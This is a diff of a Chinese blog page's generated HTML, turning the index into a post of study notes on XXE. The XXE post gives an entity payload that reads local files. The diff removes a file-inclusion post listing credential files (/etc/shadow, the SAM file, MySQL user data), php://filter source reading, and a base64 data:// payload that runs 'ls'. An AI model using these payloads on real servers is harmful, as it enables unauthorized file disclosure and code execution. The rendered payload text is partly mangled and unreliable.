@@ -20,28 +20,32 @@
     var CONFIG = {"hostname":"qianboweb.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta property="og:type" content="website">
+  <meta name="description" content="XXE漏洞1.攻击脚本">
+<meta property="og:type" content="article">
 <meta property="og:title" content="钱波的博客">
-<meta property="og:url" content="https://qianboweb.com/index.html">
+<meta property="og:url" content="https://qianboweb.com/2025/03/06/XXE%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="钱波的博客">
+<meta property="og:description" content="XXE漏洞1.攻击脚本">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-03-06T14:42:22.513Z">
+<meta property="article:modified_time" content="2025-03-06T14:42:23.443Z">
 <meta property="article:author" content="钱波">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="https://qianboweb.com/">
+<link rel="canonical" href="https://qianboweb.com/2025/03/06/XXE%E6%BC%8F%E6%B4%9E/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : true,
-    isPost : false,
+    isHome : false,
+    isPost : true,
     lang   : 'en'
   };
 </script>
 
-  <title>钱波的博客</title>
+  <title> | 钱波的博客</title>
   
 
 
@@ -139,9 +143,10 @@
         <div class="content-wrap">
           
 
-          <div class="content index posts-expand">
+          <div class="content post posts-expand">
             
-      
+
+    
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
@@ -157,10 +162,9 @@
       <meta itemprop="name" content="钱波的博客">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
+        <h1 class="post-title" itemprop="name headline">
           
-            <a href="/2025/03/06/XXE%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">Untitled</a>
-        </h2>
+        </h1>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -184,7 +188,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1><h4 id="1-攻击脚本"><a href="#1-攻击脚本" class="headerlink" title="1.攻击脚本"></a>1.攻击脚本</h4><?xml version = "1.0"?><!DOCTYPE ANY [ 		
+        <h1 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1><h4 id="1-攻击脚本"><a href="#1-攻击脚本" class="headerlink" title="1.攻击脚本"></a>1.攻击脚本</h4><?xml version = "1.0"?><!DOCTYPE ANY [ 		
 
 <!ENTITY xxe SYSTEM "file:///C://Users//20369//Desktop//test.txt"><p>]&gt; </p>
 <p><foo>&xxe;</foo></p>
@@ -207,111 +211,30 @@
 <p><strong>&amp;#x25</strong></p>
 <p>在 DTD 中，%号是参数实体的起始标志，有特殊用途。当在特定 DTD 声明语句中直接使用%号时，解析器会将其按参数实体引用的语法规则处理。但如果该%号所处位置或上下文不符合参数实体引用的规范，解析器就无法正确解析，从而报错get.php?file&#x3D;%file;’&gt;”&gt;</p>
 
-      
     </div>
 
     
     
     
+
       <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://qianboweb.com/2025/03/06/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">
+        
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="钱波">
-      <meta itemprop="description" content="">
-    </span>
 
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="钱波的博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/03/06/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">Untitled</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2025-03-06 20:13:02 / Modified: 20:16:11" itemprop="dateCreated datePublished" datetime="2025-03-06T20:13:02+08:00">2025-03-06</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>利用include()、require()、include_once()、require_once()和allow_url_include，allow_url_fopen，传入路径参数，任意读取</p>
-<h4 id="敏感路径"><a href="#敏感路径" class="headerlink" title="敏感路径:"></a>敏感路径:</h4><p>Windows系统:</p>
-<p>C:\boot.ini &#x2F;&#x2F;查看系统版本<br>C:\windows\system32\inetsrv\MetaBase.xml &#x2F;&#x2F;IIS配置文件<br>C:\windows\repair\sam &#x2F;&#x2F;存储Windows系统初次安装的密码<br>C:\ProgramFiles\mysql\my.ini &#x2F;&#x2F;Mysql配置<br>C:\ProgramFiles\mysql\data\mysql\user.MYD &#x2F;&#x2F;MySQL root密码<br>C:\windows\php.ini &#x2F;&#x2F;php配置信息</p>
-<p>Linux&#x2F;Unix系统:</p>
-<p>&#x2F;etc&#x2F;password &#x2F;&#x2F;账户信息<br>&#x2F;etc&#x2F;shadow &#x2F;&#x2F;账户密码信息<br>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;Apache2默认配置文件<br>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F;虚拟网站配置<br>&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F;PHP相关配置<br>&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;Apache配置文件<br>&#x2F;etc&#x2F;my.conf &#x2F;&#x2F;mysql配置文件</p>
-<h4 id="PHP伪协议："><a href="#PHP伪协议：" class="headerlink" title="PHP伪协议："></a>PHP伪协议：</h4><p>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php<br>对包含的PHP文件进行base64编码，include函数就不会执行代码，而是显示在页面上</p>
-<p>php:&#x2F;&#x2F;input 是一个只读的数据流，允许你以原始的形式访问 POST 请求中发送的数据。它绕过了传统的 <code>$_POST</code> 数组解析机制，因此对于处理非标准的或自定义编码的 POST 数据非常有用<br>与 <code>$_POST</code> 的比较</p>
-<table>
-<thead>
-<tr>
-<th>比较项</th>
-<th><code>php://input</code></th>
-<th><code>$_POST</code></th>
-</tr>
-</thead>
-<tbody><tr>
-<td>数据编码支持</td>
-<td>支持任何编码的 POST 数据</td>
-<td>仅支持 <code>application/x-www-form-urlencoded</code> 和 <code>multipart/form-data</code> 编码的数据</td>
-</tr>
-<tr>
-<td>数据解析</td>
-<td>提供原始的 POST 数据，需要手动解析</td>
-<td>自动解析 POST 数据，存储在关联数组中</td>
-</tr>
-<tr>
-<td>内存使用</td>
-<td>按需读取数据，节省内存</td>
-<td>一次性解析所有数据，可能消耗大量内存</td>
-</tr>
-</tbody></table>
-<p>data:&#x2F;&#x2F;<mime-type>[;base64],<data>  例：data:&#x2F;&#x2F;text&#x2F;plain&#x2F;;base64,PD9waHAgc3lzdGVtKCJscyIpPz4&#x3D;<br><strong>封装协议</strong>，允许在URL中直接嵌入数据。这种协议可以与文件系统函数（如<em>fopen()</em>、<em>copy()</em>、<em>file_exists()</em>、<em>filesize()</em>）一起使用</p>
-
-      
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/03/06/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" rel="prev" title="">
+      <i class="fa fa-chevron-left"></i> 
+    </a></div>
+      <div class="post-nav-item"></div>
     </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
       </footer>
+    
   </article>
   
   
-  
-
-
   
 
 
@@ -364,6 +287,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">XXE漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">1.攻击脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93"><span class="nav-number">1.0.0.2.</span> <span class="nav-text">2.外部实体</span></a></li></ol></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
